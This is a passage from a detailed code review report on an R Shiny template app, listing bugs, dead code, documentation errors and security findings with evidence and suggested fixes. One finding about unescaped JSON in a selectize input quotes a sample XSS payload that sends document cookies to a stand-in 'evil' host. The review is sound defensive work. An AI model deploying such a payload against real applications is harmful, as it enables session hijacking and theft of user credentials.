- Suggested direction: keep exporting, but return the failure so the caller can `showNotification()` (or write an explicit "Change summary could not be computed: …" text).

### F-s2-shiny-r-30  [minor] [logic-error]
- Where: inst/shiny/dta_app/R/versioning.R:89-97, 105-109, 328
- What: `dta_version_sanitise()` turns every `|` into a space in the recorded from/to values, so a change to a regex pattern or any value containing `|` is recorded wrongly in the version history; by its own comment the Markdown writer already escapes `|`, so the replacement only destroys content.
- Evidence:
  ```r
  # .md_table() escapes `|` and turns line breaks into <br> itself; replacing both here as well keeps the value a single plain line
  x <- gsub("[\r\n|]", " ", x)
  ```
- Failure scenario: a column pattern changes from `^(Y|N)$` to `^(Y|N|U)$`; the history entry reads `changed clinical.columns.FLAG.pattern ('^(Y N)$' -> '^(Y N U)$')` — patterns that were never in either version.
- Confidence: verified-by-reading
- Suggested direction: only collapse line breaks; leave `|` to the writers that escape it.

### F-s2-shiny-r-31  [minor] [perf]
- Where: inst/shiny/dta_app/R/template_history.R:613-624; consumer template_ui.R:533
- What: `template_history_cache` is never evicted and is keyed by a hash of the whole index plus every file's mtime, so each "Refresh templates" or library edit adds a new full set of computed histories for the process lifetime; and a history that throws is not cached at all while the caller swallows the error (`tryCatch(..., error = function(e) list())`), so every render repeats all builds and silently shows no history.
- Evidence: `key <- rlang::hash(list(index, id, file.mtime(index$path)))`; `assign(key, template_history(index, id), envir = template_history_cache)`; template_ui.R:533 `history <- tryCatch(template_history_cached(index, value$id), error = function(e) list())`.
- Failure scenario: a long-running Connect worker whose `dir:` library is edited during the day accumulates one cached history per template per edit; a library where one dependency file is unreadable rebuilds every version of the template on each picker render and shows an empty history with no reason.
- Confidence: verified-by-reading (memory growth inferred from the keying; not measured)
- Suggested direction: keep one entry per template id (replace on key change); cache the error too and show it.

### F-s2-shiny-r-32  [nit] [doc-wrong]
- Where: inst/shiny/dta_app/R/template_history.R:16-30
- What: The header announces "Three kinds of entry" and lists "initial", "version" and "upstream"; the code also produces a fourth, "manual" (`prior_versions:`), documented only at 515-522.
- Evidence: `# Three kinds of entry ("initial", below, is the oldest version with nothing to compare against):` vs `#   type      "version", "initial" ..., "manual" ... or "upstream"`.
- Failure scenario: none at run time.
- Confidence: verified-by-reading
- Suggested direction: say four kinds and list "manual".

## template_sources.R, template_index.R

### F-s2-shiny-r-33  [minor] [code-cheat]
- Where: inst/shiny/dta_app/R/template_index.R:22-24, 345-375, 408-411; consumers app.R:2675-2678, ui_components.R:731
- What: Every template file the index skips — unparseable YAML, missing `kind`/`id`/`version`, a kind that contradicts its file suffix, a duplicate id@version — is recorded only in `attr(index, "warnings")`, which nothing in the app shows and which is never signalled (only layout problems are `cli_warn`ed, line 402); the file header nevertheless says the index "turns every failure into a warning".
- Evidence:
  ```r
  # - one bad file never takes the whole picker down (read_template_header()
  #   never throws; build_template_index() turns every failure into a warning)
  warnings_acc <- c(warnings_acc, sprintf("Skipped %s: %s", f, header$error %||% "unknown error"))
  attr(out, "warnings") <- warnings_acc
  ```
  The picker reads only `layout_warnings` (tests/testthat/test-shinyapp-word-template-discovery.R:505-507: "an unrelated warning in "warnings" is not shown, whatever it says").
- Failure scenario: a template author pushes a new version whose header lacks `version:` (or duplicates an existing id@version); on the deployment the template simply is not in the picker (or the older duplicate wins) and neither the UI nor the server log says why.
- Confidence: verified-by-reading (grep for consumers of the attribute across inst/shiny/dta_app and R/: none outside tests and the qualification suite)
- Suggested direction: show the skipped-file notes in the same diagnostics panel as layout warnings (with source-relative paths), or `cli_warn()` them; fix the header comment.

### F-s2-shiny-r-53  [minor] [security]
- Where: inst/shiny/dta_app/R/template_sources.R:334-358 (dta_template_git_env), 319-326, 419
- What: The private-source credential is attached to plain `http://` origins as well as `https://`, so the Basic/Bearer token can travel in cleartext; and TLS verification is never pinned on, so a global `http.sslVerify=false` (the user's `~/.gitconfig` still applies — only the system config is suppressed) or an inherited `GIT_SSL_NO_VERIFY` silently turns certificate checking off for the authenticated fetch.
- Evidence:
  ```r
  regexec("^(?i:(https?))://(?:[^/?#@]*@)?([^/?#]+)", locator, perl = TRUE)        # http accepted
  GIT_CONFIG_KEY_0 = paste0("http.", tolower(origin[[2]]), "://", origin[[3]], "/.extraHeader")
  hardening <- c(GIT_TERMINAL_PROMPT = "0", GIT_CONFIG_NOSYSTEM = "1", GIT_ASKPASS = "")
  full_args <- c("-c", "credential.helper=", "-c", "core.askPass=", args)           # no http.sslVerify=true
  ```
  The file's own reasoning for `core.askPass` (the global config still applies, 414-418) applies equally to `http.sslVerify`.
- Failure scenario: an operator types `DTATOOLS_TEMPLATE_SOURCES="git:http://bitbucket.internal/scm/p/lib.git"`; every refresh sends `Authorization: Basic <base64(git:TOKEN)>` unencrypted, with no warning.
- Confidence: verified-by-reading
- Suggested direction: refuse (or warn and skip) the token for an `http://` origin, pass `-c http.sslVerify=true` with the other unconditional flags, and unset `GIT_SSL_NO_VERIFY` in the hardening block.

### F-s2-shiny-r-34  [minor] [design]
- Where: inst/shiny/dta_app/R/template_sources.R:406-447 (dta_template_git_run), 513-528
- What: Git clone/fetch run through `system2()` with no timeout and no low-speed limit; the hardening covers prompts only, so a server that accepts the connection and then stalls blocks the single R worker — every Shiny session of the deployment — until the TCP stack gives up.
- Evidence: `suppressWarnings(system2("git", shQuote(full_args), stdout = TRUE, stderr = TRUE))` — no `timeout =`; `dta_template_git_env()` sets only `GIT_TERMINAL_PROMPT`, `GIT_CONFIG_NOSYSTEM`, `GIT_ASKPASS` (and the scoped header).
- Failure scenario: the Bitbucket host behind `DTATOOLS_TEMPLATE_SOURCES` hangs mid-response once the 900 s TTL expires; the next session that opens the template picker (or reads the app config) freezes the whole app for minutes.
- Confidence: inferred (git/curl default timeouts not verified on the deployment; code path verified)
- Suggested direction: pass `timeout =` to `system2()` and set `http.lowSpeedLimit`/`http.lowSpeedTime` through the same `GIT_CONFIG_*` mechanism; on timeout serve the stale checkout as the code already does for other failures.

### F-s2-shiny-r-35  [nit] [doc-wrong]
- Where: inst/shiny/dta_app/R/template_sources.R:376-383, 27-30, 564-598; template_index.R:235-249
- What: (a) The "LIMITATION" comment claims two sessions refreshing a source "at the same instant can … stomp each other's variables" — impossible here: R is single-threaded and `system2()` blocks the process, so no other session's code runs inside the window; (b) `checkout` "is kept as a field and always equals `root`" and is read by no production code (only tests) — dead weight; (c) roots added from `getOption("DTAtools.template_dir")` and `./dta-templates` get no source record and are labelled `builtin` (`dta_template_source_for_root()`), so a user's own local library is recorded in provenance and shown in the picker as the packaged one.
- Evidence: `# Two sessions refreshing a git source at the same instant can therefore stomp each other's variables and fail one of the two fetches.`; `list(name = "builtin", scheme = "dir", resolved_commit = NA_character_)`.
- Failure scenario: (c) a document created from `options(DTAtools.template_dir = "~/my-lib")` records `source: builtin` and a `source_ref` of `templates/<file>`, indistinguishable from the bundled demo.
- Confidence: verified-by-reading
- Suggested direction: correct the comment, drop `checkout`, name local roots (e.g. "local:<dir>").

### F-s2-shiny-r-36  [nit] [perf]
- Where: inst/shiny/dta_app/R/template_sources.R:491-505, 75-85
- What: A cache hit still spawns `git rev-parse HEAD` (`fresh_result()` → `.dta_template_git_commit()`) on every resolution, and a malformed `DTATOOLS_TEMPLATE_REFRESH_SECONDS` emits the same warning on every call (it is read on every config/index cache check).
- Evidence: `fresh_result <- function() list(..., resolved_commit = .dta_template_git_commit(root), ...)`; `cli::cli_warn("{.envvar DTATOOLS_TEMPLATE_REFRESH_SECONDS} value ... using 900 seconds.")`.
- Failure scenario: with a typo in the env var, every `dta_app_config()`/`dta_template_index_cached()` call logs the warning.
- Confidence: verified-by-reading
- Suggested direction: store the commit in the stamp file; warn once per process.

## dataset_template.R

### F-s2-shiny-r-37  [minor] [logic-error]
- Where: inst/shiny/dta_app/R/dataset_template.R:487-510 (dataset_template_selection_values), 543-567 (build_dataset_from_template step 2); template_core.R:502-523, 750-794
- What: A dataset-template option that is not answered and has no `default:` writes NULL to its target, which `list_set_path()` turns into DELETING whatever the dataset body holds there; creation templates avoid exactly this by inheriting the default from the value already at the target (`dta_template_default(opt, md_base)`), but dataset templates always pass `NULL` as that base.
- Evidence:
  ```r
  vals[[oid]] <- if (!is.null(selections[[oid]])) selections[[oid]] else dta_template_default(opt, NULL)
  ...
  if (is.character(val) && identical(val, "__selection__")) val <- chosen   # chosen == NULL
  ds <- apply_dataset_template_path(ds, p, val)                              # list_set_path(..., NULL) removes the key
  ```
  `collect_option_effects()` returns the `target:` shorthand's `__selection__` operation even for a NULL selection (template_core.R:764-779). The only production caller passes `selections = ref$options %||% list()` (template_create.R:237), i.e. whatever the creation template's `datasets[].options:` map happens to list.
- Failure scenario: a dataset template declares column `GFNAM` with `values: [ExternalSupplierName]` and an option `vendor_name` targeting `dataset.columns.GFNAM.values` WITHOUT `default:` (the "state each value once" style the creation-template comment at template_core.R:502-508 recommends); a creation template imports it without `options:` -> the built `GFNAM` has no permitted values at all, so any vendor name validates. (The bundled `gf_smrnaseq@3.0` is safe only because it repeats the value as `default:`.)
- Confidence: verified-by-reading (bundled files checked: `biomarker_gf` imports without options, `gf_smrnaseq` has a default)
- Suggested direction: when an option is unanswered and has no default, skip its effects (or default it from the body value at its target, mirroring `dta_template_default(opt, base)`).

## party_profiles.R (+ its interplay with template_history.R / template_diff.R)

### F-s2-shiny-r-38  [major] [bug]
- Where: inst/shiny/dta_app/R/template_history.R:56-65 (template_history_build); template_diff.R:463-469 (materialise_template), 728-732 (rebase_plan target build); party_profiles.R:310-321
- What: A template with a `required: true` party slot can never be built by the template history or by a rebase: neither passes `party_selections`, and `apply_party_selections()` aborts for a required slot without a selection. The validator's own dry run supplies one (`.dta_template_party_dry_selections()`, R/validateTemplate.R:952, 1224-1245); the app-side copies of that dry-run logic only top up vocabulary slots, so the two have drifted.
- Evidence:
  ```r
  built <- create_dta_from_template(def, loaded$value$path, selections = selections, index = index,
    vocab_selections = template_history_vocab_selections(def, index),
    study_fallback = dta_template_dry_study(def))                # template_history.R: no party_selections
  if (isTRUE(slot$required)) { cli::cli_abort(c("Party slot {.val {slot$id}} is required, and no profile was selected for it.", ...)) }
  ```
  template_history.R:103-106 even says its vocabulary top-up follows "the instantiate dry-run in R/validateTemplate.R".
- Failure scenario: a company standard marks `party_slots: [{id: supplier, target: metadata.supplier, required: true}]`. `validate_template()` passes; every entry of the picker's template history shows "Party slot "supplier" is required…" instead of a change list; and every document built from it fails "Rebase" with `Could not build target template …: Party slot "supplier" is required…`.
- Confidence: verified-by-reading (all three build calls and the abort read; not executed)
- Suggested direction: share one dry-run selection helper (vocabulary + party) between R/validateTemplate.R and the app; for rebase, replay the document's own party (or skip required-slot enforcement for materialisation).

### F-s2-shiny-r-39  [minor] [doc-wrong]
- Where: inst/shiny/dta_app/R/party_profiles.R:250-263 vs 265-284
- What: `party_profile_block()` claims that omitting an empty field keeps "a value the template's own base metadata already set for the other field", but `apply_party_profile()` replaces the whole `metadata.supplier`/`receiver` property (its own comment: "WHOLE-BLOCK REPLACEMENT, NOT A MERGE"), so the base value is dropped anyway.
- Evidence: `# omitting either when the profile left it empty so an empty list() never overwrites a value the template's own base metadata already set for the other field` vs `apply_template_metadata_path(dta, target, party_profile_block(profile))` with a target that has no tail keys (template_core.R:701-710 assigns the property outright).
- Failure scenario: `base.metadata.supplier.affiliation` is set by the template and the chosen profile carries only `contacts:`; the created document's supplier has contacts and no affiliation.
- Confidence: verified-by-reading
- Suggested direction: decide one behaviour (merge the omitted field from base, or document that a profile replaces the whole party) and make both comments say it.

### F-s2-shiny-r-40  [nit] [inconsistency]
- Where: inst/shiny/dta_app/R/party_profiles.R:59-75
- What: A single contact written as a mapping (no leading `-`) is iterated field by field, every field is "malformed", and the profile ends up with no contacts plus a warning counting fields ("dropping 3 malformed contacts"); the vocabulary `columns:` reader and the collection verbs both accept that same slip as one entry.
- Evidence: `ok <- vapply(contacts, function(x) is.list(x) && !is.null(names(x)) && all(nzchar(names(x))), logical(1))` with no `if (!is.null(names(contacts))) contacts <- list(contacts)` (compare vocabulary.R:205, template_inherit.R:126-128).
- Failure scenario: `contacts: {name: Jane Doe, email: jane@example.com, role: DM}` -> "dropping 3 malformed contacts", supplier written without its signatory.
- Confidence: verified-by-reading
- Suggested direction: wrap a named list as one contact, as the other readers do.

## containers.R, utils_export.R

### F-s2-shiny-r-41  [minor] [inconsistency]
- Where: inst/shiny/dta_app/R/containers.R:95-109; utils_export.R:5-20, 205-217, 242-244; utils_dta.R:405-413, 662-668, 1318-1335, 1782-1800
- What: Package logic is re-implemented in the app on the stated grounds that "the app reaches no package internals", which is false — the same helper layer already calls internals through `get(..., envir = asNamespace("DTAtools"))` (utils_dta.R:2669-2732, template_inherit.R:641-643) — so the copies are pure drift risk; one pair has already drifted inside the app itself.
- Evidence:
  ```r
  # A mirror of dta_zip_entry_escape() (R/containerFiles.R): the app reaches no package internals   (utils_export.R:212-213)
  # Mirrors the package's internal dta_dataset_label(), which the app cannot reach                 (utils_dta.R:405-406)
  dv_glob_rx <- function(glob) { ... }   # copy of R/DTAFile-class.R:365-368 dta_container_regex()/dta_glob_matches()
  dta_dataset_spec_key <- function(body) get("dta_dataset_spec_key", envir = asNamespace("DTAtools"))(body)
  ```
  Already drifted: `has_pdf_engine()` (utils_export.R:9-20, used by the Markdown->PDF route, app.R:10053) knows 6 engines, `dta_pandoc_pdf_engine()` (utils_dta.R:1785-1800, the DOCX->PDF route) knows 9; route 1 also never passes `--pdf-engine`, so an xelatex/tectonic/wkhtmltopdf-only server passes `has_pdf_engine()` and then fails on pandoc's default `pdflatex`.
- Failure scenario: the package widens `dta_compression_extensions()` or the glob grammar; the app's container hints and slot matching (app.R:743, 1197) silently disagree with what `load_delivery()` does.
- Confidence: verified-by-reading (each pair compared; the "already drifted" engine lists read side by side)
- Suggested direction: call the package internals the way the other helpers do and delete the copies; one engine detector that also returns the engine to pass.

### F-s2-shiny-r-42  [minor] [code-cheat]
- Where: inst/shiny/dta_app/R/utils_export.R:351-355; caller app.R:10034
- What: If the document cannot be serialised, the Markdown export silently goes out without its machine-readable YAML block — the part tests/testthat/test-shinyapp-export.R:248 calls "what makes the document machine-readable".
- Evidence: `res <- dta_to_yaml_text(dta); if (!res$ok) { return(markdown_text) # Return unchanged if YAML extraction fails }`
- Failure scenario: a serialisation error (e.g. a metadata value `yaml::as.yaml()` rejects) yields a Markdown export that looks complete but cannot be re-imported; nobody is told.
- Confidence: verified-by-reading (trigger hypothetical)
- Suggested direction: fail the export (or notify) when the embedded YAML cannot be produced.

### F-s2-shiny-r-43  [minor] [perf]
- Where: inst/shiny/dta_app/R/utils_export.R:232-282 (template_has_placeholders), 292-304, 331-338, 415-417; app_config.R:603
- What: To find out whether a .docx has a `{PLACEHOLDER}`, the whole archive (every media file, no size cap) is extracted to a temp dir; this runs for every bundled template on every `list_available_templates()` call — each Export-dialog build and each `get_template_path()` membership check re-lists — and for every library template on every app-config rebuild (TTL 900 s).
- Evidence: `extracted <- tryCatch(utils::unzip(path, exdir = temp_dir), ...)` although only `word/document.xml` and `word/header*.xml`/`footer*.xml` are read; `if (!(template_name %in% unname(list_available_templates(cfg))))`.
- Failure scenario: a library Word template with large embedded images (or a highly compressible member — library content is treated as semi-trusted in app_config.R:12-26) is fully inflated into the worker's tempdir several times per export; a deflate bomb would fill the disk.
- Confidence: verified-by-reading (call sites traced; sizes not measured)
- Suggested direction: extract only the needed parts (`unzip(files = ...)`) after checking their listed sizes, and cache the result per path+mtime.

### F-s2-shiny-r-44  [nit] [dead-code]
- Where: inst/shiny/dta_app/R/containers.R:20-25
- What: `.ctr_list()` swallows any error reading `dta@containers` because "an object restored from an older version has no such property" — a compatibility path the owner does not want, which would also hide a genuine failure.
- Evidence: `cs <- tryCatch(dta@containers, error = function(e) NULL)`.
- Failure scenario: none functionally; dead weight.
- Confidence: verified-by-reading
- Suggested direction: `dta@containers` directly.

## template_ui.R

### F-s2-shiny-r-45  [major] [security]
- Where: inst/shiny/dta_app/R/template_ui.R:854-887 (template_vocab_slot_specs), 896-923 (tmpl_vocab_selectize_options), 989-993; also 691-717 (option id inside the `onChange` JS of `with_suggestions()`)
- What: Template-authored text — every vocabulary term's code, label and description, and an option's `id` — is placed in `selectizeInput(options = ...)`, which Shiny writes as JSON inside a `<script type="application/json">` element; JSON serialisation does not escape `</`, so a term label containing `</script>` would end that element and the rest would be parsed as live markup in the options dialog.
- Evidence:
  ```r
  label = if (nzchar(lab) && !identical(lab, code)) paste0(code, " — ", lab) else code,
  description = as.character(term$description %||% "")
  list(options = items, ..., render = I(render_option))           # -> selectizeInput(iid, NULL, options = ...)
  jsonlite::toJSON(iid, auto_unbox = TRUE)                        # iid = paste0("tmpl_opt_", <template option id>)
  ```
  The file itself treats this text as hostile (104-109: "would make any template file able to inject script into the picker"; 945-949: a slot id "must never be spliced into a JS string literal"); the repo's tests check `</script>` only in the app's own JS constants (test-shinyapp-modal-outputs.R:156-158 etc.), never in data.
- Failure scenario: a vocabulary file in a configured git library carries `label: "Screening</script><img src=x onerror=fetch('https://evil/'+document.cookie)>"`; anyone opening the "Create new from template" options dialog for a template with a slot on that vocabulary runs the handler in the app's origin (on Posit Connect, shared with every other app).
- Confidence: inferred — the app-side data flow is verified by reading; that shiny 1.14.0's `selectizeInput()` serialises `options` with jsonlite without escaping `</` was not verified (shiny's R source is not in the snapshot; its NEWS.md mentions no such escaping).
- Suggested direction: escape `</` (e.g. `gsub("</", "<\/", ...)` the way htmlwidgets does) or keep term data out of the inline JSON (send it with `updateSelectizeInput(server = TRUE)`); add a test with `</script>` in a term label.

### F-s2-shiny-r-46  [minor] [bug]
- Where: inst/shiny/dta_app/R/template_ui.R:334-343; app.R:2508-2513, 2562-2567 (consumer) vs app.R:378-381
- What: The picker reports its own closing through a native `document.addEventListener('hidden.bs.modal', …)` listener, but app.R explains (for the scroll-lock fix) that this native event never reaches `document` for a Shiny modal — Shiny's jQuery handler removes the dialog before Bootstrap dispatches it from the detached node. So `input$template_picker_closed` is never sent, `tmpl_picker_open` never returns to FALSE after the first open, and the "render NOTHING while the modal is closed" defence against the stale-modal-content trap is dead; only the open tick remains.
- Evidence:
  ```js
  document.addEventListener('hidden.bs.modal', function(ev){ ... Shiny.setInputValue('template_picker_closed', Date.now(), {priority: 'event'}); })
  ```
  app.R:378-381: "A jQuery handler, not addEventListener …: Shiny removes the dialog from the page inside its own jQuery 'hidden' handler, and Bootstrap sends the native event only after that, from a node that is no longer in the document, so it never reaches `document`." The only writer of `tmpl_picker_open(FALSE)` is `observeEvent(input$template_picker_closed, …)` (app.R:2567); tests feed that input by hand (test-shinyapp-template-ui.R:449, 529).
- Failure scenario: open the picker, check a row, Cancel, reopen: the client re-inserts its cached picker HTML and reports the old checked radio (the "seen happen" trap described at app.R:2499-2506), which the closed-state blanking was meant to prevent.
- Confidence: inferred (relies on the app's own documented observation about Bootstrap/Shiny event order; no browser run)
- Suggested direction: use `$(document).on('hidden.bs.modal', …)` as the scroll-lock fix does, and test the script in the existing chromote browser test.

### F-s2-shiny-r-47  [minor] [doc-wrong]
- Where: inst/shiny/dta_app/R/template_ui.R:1275, 449-454, 745-748
- What: User-facing text and defaults in the options dialog say things the code does not do: (a) the vocabulary section promises "Each column keeps exactly the terms chosen here", which F-s2-shiny-r-20/21 show is false for "None" and for an open slot holding only typed terms; (b) any `variants:` selector is described as "The selected platform determines the datasets…", although a variant can be anything; (c) a `type: number` option without `default:` is pre-filled with 0 (`as.numeric(def %||% 0)`), and unless the author clears it, 0 is written to the document — while the section hint says "Pre-filled with the template's values".
- Evidence: `"Pick the terms this study collects. Each column keeps exactly the terms chosen here."`; `" first. The selected platform determines the datasets and agreement options."`; `numericInput(iid, NULL, value = suppressWarnings(as.numeric(def %||% 0)), width = "100%")`.
- Failure scenario: (c) a template option "Planned number of subjects" with no default creates every document with 0 subjects unless each author notices and clears it.
- Confidence: verified-by-reading
- Suggested direction: fix the wording; start a number option with no default empty (`value = NA`).

### F-s2-shiny-r-48  [nit] [security]
- Where: inst/shiny/dta_app/R/template_ui.R:492-503; message source template_create.R:59-61
- What: A template-load error is shown verbatim in the picker, and the resolver's message carries the absolute server path of the parent file — the index's own rule is that text shown to people "who cannot see the server" carries a source-relative path, "never an absolute path" (template_index.R:266-268).
- Evidence: `cli::cli_abort("Template {.val {ref}} is indexed at {.path {row$path[[1]]}} but could not be read: {read$error}")`; `paste0("This template cannot be used: ", as.character(loaded$error %||% "unknown error"), ...)`.
- Failure scenario: a broken parent in a git library shows every user something like `.../AppData/Local/R/cache/R/DTAtools/git/<hash>/templates/base.dta-template.yaml`, disclosing the service account's home and cache layout.
- Confidence: verified-by-reading
- Suggested direction: report the source name plus the library-relative path, as the layout warnings do.

## theme.R, ui_components.R

### F-s2-shiny-r-49  [minor] [dead-code]
- Where: inst/shiny/dta_app/R/theme.R:1615-1628 (`slot_state_label()`), 1630-1699 (`yaml_highlight_html()`), 358-359 and 630-644 (their CSS)
- What: Confirms F-t-shiny-1-36 and extends it: besides `slot_state_label()`, the YAML syntax highlighter and its whole `.yaml-view` dark theme have no caller in the app (the Raw YAML tab is an Ace editor, `.yaml-ace-wrap`); `.slot-ok`/`.slot-warn` are used only by the dead function. Tests (test-shinyapp-theme.R, test-shinyapp-harness.R:59) are what keep them alive.
- Evidence: grep for `slot_state_label`, `yaml_highlight_html`, `yaml-view`, `slot-ok`, `slot-warn` over R/, inst/ (app.R included) and vignettes: only the definitions in theme.R.
- Failure scenario: none at run time; ~90 lines of code and CSS plus tests that assert on behaviour no user can reach.
- Confidence: verified-by-reading
- Suggested direction: delete both functions, their CSS and their tests.

### F-s2-shiny-r-50  [minor] [inconsistency]
- Where: inst/shiny/dta_app/R/theme.R:384, 436, 740-741, 1059, 1300, 1305, 1311, 1329, 1369, 1444, 1485; ui_components.R:746, 761
- What: The palette is documented as replaceable per library (`colors:` in dta-app.yaml; theme.R:13-15 "so a template library's dta-app.yaml can replace it"), but a dozen rules hard-code the stock primary `#00625B` as `rgba(0,98,91,…)` and two diagnostics hard-code `color:#b91c1c` instead of using the `--bi-*` variables.
- Evidence: `border: 2px dashed rgba(0,98,91,.7);` (drop zones), `.tmpl-row.selected { ... background: rgba(0,98,91,.06); }`, `.dataset-nav-row.active { border-top-color: rgba(0,98,91,.25); ... }`, `style = "color:#b91c1c;"`.
- Failure scenario: a library sets `colors: {primary: "#1F4E79"}`; buttons and headings turn blue, while every drop zone, the active dataset row, the selected template row, the picker's match highlight and the "Required" badge stay teal.
- Confidence: verified-by-reading
- Suggested direction: derive these from the variables (`color-mix(in srgb, var(--bi-green) 70%, transparent)` or an rgb triplet variable emitted by `bi_css()`, as the glow already is).

### F-s2-shiny-r-51  [nit] [doc-wrong]
- Where: inst/shiny/dta_app/R/theme.R:4-6, 793-794, 805-806, 842-845; ui_components.R:128-131, 719-729, 917-920
- What: Stale or wrong statements in comments and one label: theme.R says "Replace the hex values below with the official Boehringer Ingelheim brand palette" though the palette moved to app_config.R; the footer comment lists "version + author + GitHub link" (there is no author, the label comes from the config) and puts `foot-sep` in app.R (it is in ui_components.R); "No pseudo-element rules here … a CSS double-colon pseudo-element reads to that scanner as a package" is obsolete — the scanner strips pseudo-elements (tests/testthat/test-run-dta-app.R:47-83) and theme.R has about ten of them; ui_components.R calls `ds_edit_menu_item()` and `contact_detail_block()` "above" `new_version_modal_body()` (both are below), and the comment for `template_source_diagnostics_ui()` sits above `template_layout_warnings()`; the footer link always reads "GitHub repository" even when `links.repository` points at another host.
- Evidence: `# NOTE: Replace the hex values below with the official Boehringer Ingelheim brand palette`; `tags$a(href = repo, ..., "GitHub repository")`.
- Failure scenario: an internal deployment pointing `links.repository` at its Bitbucket shows "GitHub repository".
- Confidence: verified-by-reading
- Suggested direction: update the comments; label the link "Repository" (or make the label configurable).

## Cross-file

### F-s2-shiny-r-52  [nit] [dead-code]
- Where: inst/shiny/dta_app/R/template_core.R:116-123, 1095, 1235; template_create.R:191-197
- What: Creation templates still accept datasets under the "legacy" `base.datasets` location, folded up at read time and consulted again as a `%||%` fallback in both dataset builders; no bundled or skeleton template uses it and no user documentation mentions it — a compatibility reader the owner wants gone. It also leaves a parent's `base.datasets` inside `base` after the fold, so the fallback can resurrect it.
- Evidence: `# Accept dataset definitions in either base.datasets (legacy) or top-level datasets (preferred...)`; `ds_refs <- template_def$datasets %||% base$datasets %||% list()`.
- Failure scenario: none functionally; two extra code paths (and the mixin shape check's special "base.datasets is not allowed" rule) exist only for an old format.
- Confidence: verified-by-reading (grep of inst/extdata/library, inst/extdata/template-repo-skeleton, DTA_YAML_GUIDE.md and vignettes for `base.datasets`: none)
- Suggested direction: drop the legacy location; `validate_template()` can report it as an unknown key.

---

## Coverage

Files fully read (every line): `app_config.R` (678), `containers.R` (418), `dataset_template.R` (646), `party_profiles.R` (359), `template_core.R` (1323), `template_create.R` (497), `template_diff.R` (955), `template_history.R` (624), `template_index.R` (868), `template_inherit.R` (1352), `template_sources.R` (642), `template_ui.R` (1396), `theme.R` (1699 — R code and all CSS read), `ui_components.R` (923), `utils_dta.R` (5788), `utils_export.R` (473), `versioning.R` (463), `vocabulary.R` (1087).

Only skimmed: none of the slice. Outside the slice, read only where a finding depended on it: app.R call sites (status/load/check, export, template create, picker), R/validationReporting.R (results), R/DTA-class.R (summary rule), R/DTADataSetTabular-class.R (validation_status, import issues), R/DTAFile-class.R (glob, compression), R/validateTemplate.R (engine loader, dry-run selections), bundled library templates, tests named in findings.

Not read: nothing in the slice. Not run: no R, no browser (per the brief) — F-45 and F-46 are marked inferred for that reason.

Cross-reviewer items confirmed: F-t-shiny-1-14 (as F-21), F-t-shiny-1-18 (extended as F-23), F-t-shiny-1-25/26 (F-27), F-t-shiny-1-27 (F-14), F-t-shiny-1-36 (extended as F-49), F-t-shiny-1-03 (`dataset_only`, F-04).
